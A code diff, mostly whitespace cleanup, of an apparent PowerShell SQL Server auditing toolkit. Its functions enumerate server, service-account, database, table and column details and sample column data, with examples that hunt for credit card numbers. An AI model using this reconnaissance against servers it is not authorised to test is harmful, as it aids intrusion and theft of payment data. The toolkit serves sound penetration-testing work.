-            DECLARE @ServiceaccountName varchar(250)  
-            EXECUTE master.dbo.xp_instance_regread  
-            N'HKEY_LOCAL_MACHINE', @SQLServerInstance,  
+            -- Get SQL Server Service Account
+            DECLARE @ServiceaccountName varchar(250)
+            EXECUTE master.dbo.xp_instance_regread
+            N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
             N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'
 
             -- Get authentication mode
-            DECLARE @AuthenticationMode INT  
-            EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE', 
-            N'Software\Microsoft\MSSQLServer\MSSQLServer',   
-            N'LoginMode', @AuthenticationMode OUTPUT  
+            DECLARE @AuthenticationMode INT
+            EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
+            N'Software\Microsoft\MSSQLServer\MSSQLServer',
+            N'LoginMode', @AuthenticationMode OUTPUT
 
             -- Grab additional information as sysadmin
             $SysadminSetup
@@ -1403,16 +1405,16 @@ Function  Get-SQLServerInfo
             -- Return server and version information
             SELECT  '$ComputerName' as [ComputerName],
             @@servername as [Instance],
-            DEFAULT_DOMAIN() as [DomainName],                            
+            DEFAULT_DOMAIN() as [DomainName],
             @SQLServerServiceName as [ServiceName],
             @ServiceAccountName as [ServiceAccount],
-            (SELECT CASE @AuthenticationMode    
-            WHEN 1 THEN 'Windows Authentication'   
-            WHEN 2 THEN 'Windows and SQL Server Authentication'   
-            ELSE 'Unknown'  
-            END) as [AuthenticationMode],  
-            CASE  SERVERPROPERTY('IsClustered') 
-            WHEN 0 
+            (SELECT CASE @AuthenticationMode
+            WHEN 1 THEN 'Windows Authentication'
+            WHEN 2 THEN 'Windows and SQL Server Authentication'
+            ELSE 'Unknown'
+            END) as [AuthenticationMode],
+            CASE  SERVERPROPERTY('IsClustered')
+            WHEN 0
             THEN 'No'
             ELSE 'Yes'
             END as [Clustered],
@@ -1428,40 +1430,40 @@ Function  Get-SQLServerInfo
         '$ActiveSessions' as [ActiveSessions]"
         # Execute Query
         $TblServerInfoTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
-        
+
         # Append as needed
         $TblServerInfo = $TblServerInfo + $TblServerInfoTemp
     }
 
     End
-    {  
+    {
         # Return data
-        $TblServerInfo             
+        $TblServerInfo
     }
 }
 
 
 # ----------------------------------
-#  Get-SQLServerInfoThreaded 
+#  Get-SQLServerInfoThreaded
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLServerInfoThreaded 
+Function  Get-SQLServerInfoThreaded
 {
     <#
             .SYNOPSIS
             Returns basic server and user information from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER Instance
             Number of host threads.
             .EXAMPLE
-            PS C:\> Get-SQLServerInfoThreaded -Instance SQLServer1\STANDARDDEV2014 
+            PS C:\> Get-SQLServerInfoThreaded -Instance SQLServer1\STANDARDDEV2014
 
             ComputerName           : SQLServer1
             Instance               : SQLServer1\STANDARDDEV2014
@@ -1498,9 +1500,9 @@ Function  Get-SQLServerInfoThreaded
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
@@ -1530,7 +1532,7 @@ Function  Get-SQLServerInfoThreaded
         $null = $TblServerInfo.Columns.Add('SQLServerServicePack')
         $null = $TblServerInfo.Columns.Add('OSArchitecture')
         $null = $TblServerInfo.Columns.Add('OsMachineType')
-        $null = $TblServerInfo.Columns.Add('OSVersionName') 
+        $null = $TblServerInfo.Columns.Add('OSVersionName')
         $null = $TblServerInfo.Columns.Add('OsVersionNumber')
         $null = $TblServerInfo.Columns.Add('Currentlogin')
         $null = $TblServerInfo.Columns.Add('IsSysadmin')
@@ -1540,16 +1542,17 @@ Function  Get-SQLServerInfoThreaded
         $PipelineItems = New-Object -TypeName System.Data.DataTable
 
         # set instance to local host by default
-        if(-not $Instance){ 
+        if(-not $Instance)
+        {
             $Instance = $env:COMPUTERNAME
         }
 
         # Ensure provided instance is processed
         if($Instance)
-        {            
+        {
             $ProvideInstance = New-Object -TypeName PSObject -Property @{
                 Instance = $Instance
-            }            
+            }
         }
 
         # Add instance to instance list
@@ -1557,13 +1560,13 @@ Function  Get-SQLServerInfoThreaded
     }
 
     Process
-    {      
+    {
         # Create list of pipeline items
-        $PipelineItems = $PipelineItems + $_         
+        $PipelineItems = $PipelineItems + $_
     }
 
     End
-    {   
+    {
         # Define code to be multi-threaded
         $MyScriptBlock = {
             $Instance = $_.Instance
@@ -1617,7 +1620,7 @@ Function  Get-SQLServerInfoThreaded
                     EXECUTE master.dbo.xp_regread
                     @rootkey		= N'HKEY_LOCAL_MACHINE',
                     @key			= N'SYSTEM\CurrentControlSet\Control\ProductOptions',
-                    @value_name		= N'ProductType', 
+                    @value_name		= N'ProductType',
                     @value			= @MachineType output
 
                     -- Get OS version
@@ -1625,7 +1628,7 @@ Function  Get-SQLServerInfoThreaded
                     EXECUTE master.dbo.xp_regread
                     @rootkey		= N'HKEY_LOCAL_MACHINE',
                     @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion',
-                    @value_name		= N'ProductName', 
+                    @value_name		= N'ProductName',
                 @value			= @ProductName output"
 
                 $SysadminQuery = '  @MachineType as [OsMachineType],
@@ -1638,33 +1641,33 @@ Function  Get-SQLServerInfoThreaded
             }
 
             # Define Query
-            $Query = "  -- Get SQL Server Information 
+            $Query = "  -- Get SQL Server Information
 
-                -- Get SQL Server Service Name and Path 
-                DECLARE @SQLServerInstance varchar(250) 
-                DECLARE @SQLServerServiceName varchar(250) 
+                -- Get SQL Server Service Name and Path
+                DECLARE @SQLServerInstance varchar(250)
+                DECLARE @SQLServerServiceName varchar(250)
                 if @@SERVICENAME = 'MSSQLSERVER'
-                BEGIN											
+                BEGIN
                 set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
                 set @SQLServerServiceName = 'MSSQLSERVER'
-                END						
+                END
                 ELSE
                 BEGIN
-                set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))		
-                set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))							
+                set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
+                set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
                 END
 
-                -- Get SQL Server Service Account 
-                DECLARE @ServiceaccountName varchar(250)  
-                EXECUTE master.dbo.xp_instance_regread  
-                N'HKEY_LOCAL_MACHINE', @SQLServerInstance,  
+                -- Get SQL Server Service Account
+                DECLARE @ServiceaccountName varchar(250)
+                EXECUTE master.dbo.xp_instance_regread
+                N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
                 N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'
 
                 -- Get authentication mode
-                DECLARE @AuthenticationMode INT  
-                EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE', 
-                N'Software\Microsoft\MSSQLServer\MSSQLServer',   
-                N'LoginMode', @AuthenticationMode OUTPUT  
+                DECLARE @AuthenticationMode INT
+                EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
+                N'Software\Microsoft\MSSQLServer\MSSQLServer',
+                N'LoginMode', @AuthenticationMode OUTPUT
 
                 -- Grab additional information as sysadmin
                 $SysadminSetup
@@ -1672,16 +1675,16 @@ Function  Get-SQLServerInfoThreaded
                 -- Return server and version information
                 SELECT  '$ComputerName' as [ComputerName],
                 @@servername as [Instance],
-                DEFAULT_DOMAIN() as [DomainName],                            
+                DEFAULT_DOMAIN() as [DomainName],
                 @SQLServerServiceName as [ServiceName],
                 @ServiceAccountName as [ServiceAccount],
-                (SELECT CASE @AuthenticationMode    
-                WHEN 1 THEN 'Windows Authentication'   
-                WHEN 2 THEN 'Windows and SQL Server Authentication'   
-                ELSE 'Unknown'  
-                END) as [AuthenticationMode],  
-                CASE  SERVERPROPERTY('IsClustered') 
-                WHEN 0 
+                (SELECT CASE @AuthenticationMode
+                WHEN 1 THEN 'Windows Authentication'
+                WHEN 2 THEN 'Windows and SQL Server Authentication'
+                ELSE 'Unknown'
+                END) as [AuthenticationMode],
+                CASE  SERVERPROPERTY('IsClustered')
+                WHEN 0
                 THEN 'No'
                 ELSE 'Yes'
                 END as [Clustered],
@@ -1696,8 +1699,8 @@ Function  Get-SQLServerInfoThreaded
                 '$IsSysadmin' as [IsSysadmin],
             '$ActiveSessions' as [ActiveSessions]"
             # Execute Query
-            $TblServerInfoTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose            
-        
+            $TblServerInfoTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+
             # Append as needed
             $TblServerInfoTemp |
             ForEach-Object -Process {
@@ -1723,12 +1726,12 @@ Function  Get-SQLServerInfoThreaded
                     $_.ActiveSessions
                 )
             }
-        }         
+        }
 
         # Run scriptblock using multi-threading
-        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue                
+        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
 
-        return $TblServerInfo 
+        return $TblServerInfo
     }
 }
 
@@ -1737,21 +1740,21 @@ Function  Get-SQLServerInfoThreaded
 #  Get-SQLDatabase
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLDatabase 
+Function  Get-SQLDatabase
 {
     <#
             .SYNOPSIS
             Returns database information from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DAC
-            Connect using Dedicated Admin Connection. 
+            Connect using Dedicated Admin Connection.
             .PARAMETER DatabaseName
             Database name to filter for.
             .PARAMETER NoDefaults
@@ -1796,15 +1799,15 @@ Function  Get-SQLDatabase
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipeline = $true,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Database name.')]
         [string]$DatabaseName,
 
@@ -1889,7 +1892,7 @@ Function  Get-SQLDatabase
     }
 
     Process
-    {    
+    {
         # Parse computer name from the instance
         $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
 
@@ -1918,9 +1921,9 @@ Function  Get-SQLDatabase
             }
             return
         }
-           
+
         # Check version
-        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber         
+        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
         if($SQLVersionFull)
         {
             $SQLVersionShort = $SQLVersionFull.Split('.')[0]
@@ -1932,21 +1935,21 @@ Function  Get-SQLDatabase
             a.database_id as [DatabaseId],
             a.name as [DatabaseName],
             SUSER_SNAME(a.owner_sid) as [DatabaseOwner],
-            IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid)) as [OwnerIsSysadmin],     
+            IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid)) as [OwnerIsSysadmin],
             a.is_trustworthy_on,
         a.is_db_chaining_on,"
 
         # Version specific columns
         if([int]$SQLVersionShort -ge 10)
         {
-            $QueryVerSpec = '  
+            $QueryVerSpec = '
                 a.is_broker_enabled,
                 a.is_encrypted,
             a.is_read_only,'
         }
 
         # Query end
-        $QueryEnd = '  
+        $QueryEnd = '
             a.create_date,
             a.recovery_model_desc,
             b.filename as [FileName],
@@ -1966,18 +1969,18 @@ Function  Get-SQLDatabase
 
         $Query = "$QueryStart $QueryVerSpec $QueryEnd $Filters"
 
-        # Execute Query        
-        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose                              
+        # Execute Query
+        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
 
         # Append results for pipeline items
-        $TblResults | 
+        $TblResults |
         ForEach-Object -Process {
             # Set version specific values
             if([int]$SQLVersionShort -ge 10)
             {
                 $is_broker_enabled = $_.is_broker_enabled
                 $is_encrypted = $_.is_encrypted
-                $is_read_only = $_.is_read_only 
+                $is_read_only = $_.is_read_only
             }
             else
             {
@@ -1985,7 +1988,7 @@ Function  Get-SQLDatabase
                 $is_encrypted = 'NA'
                 $is_read_only = 'NA'
             }
-            
+
             $null = $TblDatabases.Rows.Add(
                 $_.ComputerName,
                 $_.Instance,
@@ -2004,14 +2007,14 @@ Function  Get-SQLDatabase
                 $_.DbSizeMb,
                 $_.has_dbaccess
             )
-        } 
-                                
+        }
+
     }
 
     End
-    {  
+    {
         # Return data
-        $TblDatabases              
+        $TblDatabases
     }
 }
 
@@ -2020,21 +2023,21 @@ Function  Get-SQLDatabase
 #  Get-SQLDatabaseThreaded
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLDatabaseThreaded 
+Function  Get-SQLDatabaseThreaded
 {
     <#
             .SYNOPSIS
             Returns database information from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DAC
-            Connect using Dedicated Admin Connection. 
+            Connect using Dedicated Admin Connection.
             .PARAMETER DatabaseName
             Database name to filter for.
             .PARAMETER NoDefaults
@@ -2081,15 +2084,15 @@ Function  Get-SQLDatabaseThreaded
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipeline = $true,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Database name.')]
         [string]$DatabaseName,
 
@@ -2179,18 +2182,19 @@ Function  Get-SQLDatabaseThreaded
         # Setup data table for pipeline threading
         $PipelineItems = New-Object -TypeName System.Data.DataTable
 
-        
+
         # set instance to local host by default
-        if(-not $Instance){ 
+        if(-not $Instance)
+        {
             $Instance = $env:COMPUTERNAME
         }
 
         # Ensure provided instance is processed
         if($Instance)
-        {            
+        {
             $ProvideInstance = New-Object -TypeName PSObject -Property @{
                 Instance = $Instance
-            }            
+            }
         }
 
         # Add instance to instance list
@@ -2198,16 +2202,15 @@ Function  Get-SQLDatabaseThreaded
     }
 
     Process
-    {      
+    {
         # Create list of pipeline items
-        $PipelineItems = $PipelineItems + $_         
+        $PipelineItems = $PipelineItems + $_
     }
 
     End
-    {   
+    {
         # Define code to be multi-threaded
         $MyScriptBlock = {
-
             # Set instance
             $Instance = $_.Instance
 
@@ -2233,9 +2236,9 @@ Function  Get-SQLDatabaseThreaded
                 }
                 return
             }
-           
+
             # Check version
-            $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber         
+            $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
             if($SQLVersionFull)
             {
                 $SQLVersionShort = $SQLVersionFull.Split('.')[0]
@@ -2247,21 +2250,21 @@ Function  Get-SQLDatabaseThreaded
                 a.database_id as [DatabaseId],
                 a.name as [DatabaseName],
                 SUSER_SNAME(a.owner_sid) as [DatabaseOwner],
-                IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid)) as [OwnerIsSysadmin],     
+                IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid)) as [OwnerIsSysadmin],
                 a.is_trustworthy_on,
             a.is_db_chaining_on,"
 
             # Version specific columns
             if([int]$SQLVersionShort -ge 10)
             {
-                $QueryVerSpec = '  
+                $QueryVerSpec = '
                     a.is_broker_enabled,
                     a.is_encrypted,
                 a.is_read_only,'
             }
 
             # Query end
-            $QueryEnd = '  
+            $QueryEnd = '
                 a.create_date,
                 a.recovery_model_desc,
                 b.filename as [FileName],
@@ -2281,18 +2284,18 @@ Function  Get-SQLDatabaseThreaded
 
             $Query = "$QueryStart $QueryVerSpec $QueryEnd $Filters"
 
-            # Execute Query        
-            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose                              
+            # Execute Query
+            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
 
             # Append results for pipeline items
-            $TblResults | 
+            $TblResults |
             ForEach-Object -Process {
                 # Set version specific values
                 if([int]$SQLVersionShort -ge 10)
                 {
                     $is_broker_enabled = $_.is_broker_enabled
                     $is_encrypted = $_.is_encrypted
-                    $is_read_only = $_.is_read_only 
+                    $is_read_only = $_.is_read_only
                 }
                 else
                 {
@@ -2300,7 +2303,7 @@ Function  Get-SQLDatabaseThreaded
                     $is_encrypted = 'NA'
                     $is_read_only = 'NA'
                 }
-            
+
                 $null = $TblDatabases.Rows.Add(
                     $_.ComputerName,
                     $_.Instance,
@@ -2320,10 +2323,10 @@ Function  Get-SQLDatabaseThreaded
                     $_.has_dbaccess
                 )
             }
-        }         
+        }
 
         # Run scriptblock using multi-threading
-        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue                
+        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
 
         return $TblDatabases
     }
@@ -2334,25 +2337,25 @@ Function  Get-SQLDatabaseThreaded
 #  Get-SQLTable
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLTable 
+Function  Get-SQLTable
 {
     <#
             .SYNOPSIS
             Returns table information from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DatabaseName
-            Database name to filter for. 
+            Database name to filter for.
             .PARAMETER TableName
-            Table name to filter for. 
+            Table name to filter for.
             .PARAMETER NoDefaults
-            Filter out results from default databases. 
+            Filter out results from default databases.
             .EXAMPLE
             PS C:\> Get-SQLTable -Instance SQLServer1\STANDARDDEV2014 -NoDefaults  -DatabaseName testdb
 
@@ -2375,12 +2378,12 @@ Function  Get-SQLTable
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
@@ -2388,19 +2391,19 @@ Function  Get-SQLTable
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
-        [Parameter(Mandatory = $false,               
-        ValueFromPipelineByPropertyName = $true,
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Database name.')]
         [string]$DatabaseName,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Table name.')]
         [string]$TableName,
 
@@ -2416,7 +2419,7 @@ Function  Get-SQLTable
     Begin
     {
         $TblTables = New-Object -TypeName System.Data.DataTable
-        
+
         # Setup table filter
         if($TableName)
         {
@@ -2471,11 +2474,11 @@ Function  Get-SQLTable
         else
         {
             # Get list of databases
-            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose         
+            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
         }
 
         # Get tables for each database
-        $TblDatabases | 
+        $TblDatabases |
         ForEach-Object -Process {
             # Get database name
             $DbName = $_.DatabaseName
@@ -2494,21 +2497,21 @@ Function  Get-SQLTable
                 TABLE_NAME as [TableName],
                 TABLE_TYPE as [TableType]
                 FROM [$DbName].[INFORMATION_SCHEMA].[TABLES]
-                $TableFilter 
+                $TableFilter
             ORDER BY TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME"
 
             # Execute Query
             $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
 
-            # Append results 
-            $TblTables = $TblTables + $TblResults 
-        }        
+            # Append results
+            $TblTables = $TblTables + $TblResults
+        }
     }
 
     End
-    {  
+    {
         # Return data
-        $TblTables              
+        $TblTables
     }
 }
 
@@ -2517,25 +2520,25 @@ Function  Get-SQLTable
 #  Get-SQLColumn
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLColumn 
+Function  Get-SQLColumn
 {
     <#
             .SYNOPSIS
             Returns column information from target SQL Servers. Supports keyword search.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DAC
-            Connect using Dedicated Admin Connection. 
+            Connect using Dedicated Admin Connection.
             .PARAMETER DatabaseName
             Database name filter.
             .PARAMETER TableName
-            Table name filter. 
+            Table name filter.
             .PARAMETER ColumnName
             Column name filter.
             .PARAMETER ColumnNameSearch
@@ -2545,17 +2548,17 @@ Function  Get-SQLColumn
             .EXAMPLE
             PS C:\> Get-SQLColumn -Verbose -Instance "SQLServer1"
             .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLColumn -Verbose    
+            PS C:\> Get-SQLInstanceLocal | Get-SQLColumn -Verbose
     #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
@@ -2563,29 +2566,29 @@ Function  Get-SQLColumn
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
-        [Parameter(Mandatory = $false,               
-        ValueFromPipelineByPropertyName = $true,
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Database name.')]
         [string]$DatabaseName,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Table name.')]
         [string]$TableName,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Filter by exact column name.')]
         [string]$ColumnName,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Column name using wildcards in search.  Supports comma seperated list.')]
         [string]$ColumnNameSearch,
 
@@ -2637,12 +2640,12 @@ Function  Get-SQLColumn
         if($ColumnNameSearch)
         {
             $Keywords = $ColumnNameSearch.split(',')
-            
+
             [int]$i = $Keywords.Count
             while ($i -gt 0)
             {
                 $i = $i - 1
-                $Keyword = $Keywords[$i]                
+                $Keyword = $Keywords[$i]
 
                 if($i -eq ($Keywords.Count -1))
                 {
@@ -2652,8 +2655,8 @@ Function  Get-SQLColumn
                 {
                     $ColumnSearchFilter = $ColumnSearchFilter + " or column_name like '%$Keyword%'"
                 }
-            }             
-        }   
+            }
+        }
     }
 
     Process
@@ -2702,10 +2705,10 @@ Function  Get-SQLColumn
         }
 
         # Get tables for each database
-        $TblDatabases | 
+        $TblDatabases |
         ForEach-Object -Process {
             # Get database name
-            $DbName = $_.DatabaseName         
+            $DbName = $_.DatabaseName
 
             # Define Query
             $Query = "  USE $DbName;
@@ -2726,15 +2729,15 @@ Function  Get-SQLColumn
             # Execute Query
             $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose
 
-            # Append results             
+            # Append results
             $TblColumns = $TblColumns + $TblResults
-        }        
+        }
     }
 
     End
-    {  
+    {
         # Return data
-        $TblColumns           
+        $TblColumns
     }
 }
 
@@ -2743,19 +2746,19 @@ Function  Get-SQLColumn
 # Get-SQLColumnSampleData
 # ---------------------------------------
 # Author: Scott Sutherland
-Function Get-SQLColumnSampleData 
+Function Get-SQLColumnSampleData
 {
     <#
             .SYNOPSIS
             Returns column information from target SQL Servers. Supports search by keywords, sampling data, and validating credit card numbers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER $NoOutput
             Don't output any sample data.
             .PARAMETER SampleSize
@@ -2778,9 +2781,9 @@ Function Get-SQLColumnSampleData
             VERBOSE: SQLServer1\STANDARDDEV2014 : - Selecting 5 rows of data sample from column [testdb].[dbo].[tracking].[card].
             VERBOSE: SQLServer1\STANDARDDEV2014 : COMPLETED SEARCH DATA BY COLUMN
 
-            ComputerName   Instance                   Database Schema Table    Column Sample           RowCount IsCC 
-            ------------   --------                   -------- ------ -----    ------ ------           -------- ---- 
-            SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   4111111111111111 2        True 
+            ComputerName   Instance                   Database Schema Table    Column Sample           RowCount IsCC
+            ------------   --------                   -------- ------ -----    ------ ------           -------- ----
+            SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   4111111111111111 2        True
             SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   41111111111ASDFD 2        False
             .EXAMPLE
             PS C:\> Get-SQLInstanceLocal | Get-SQLColumnSampleData -Keywords "account,credit,card" -SampleSize 5 -ValidateCC
@@ -2796,19 +2799,19 @@ Function Get-SQLColumnSampleData
         [string]$Password,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
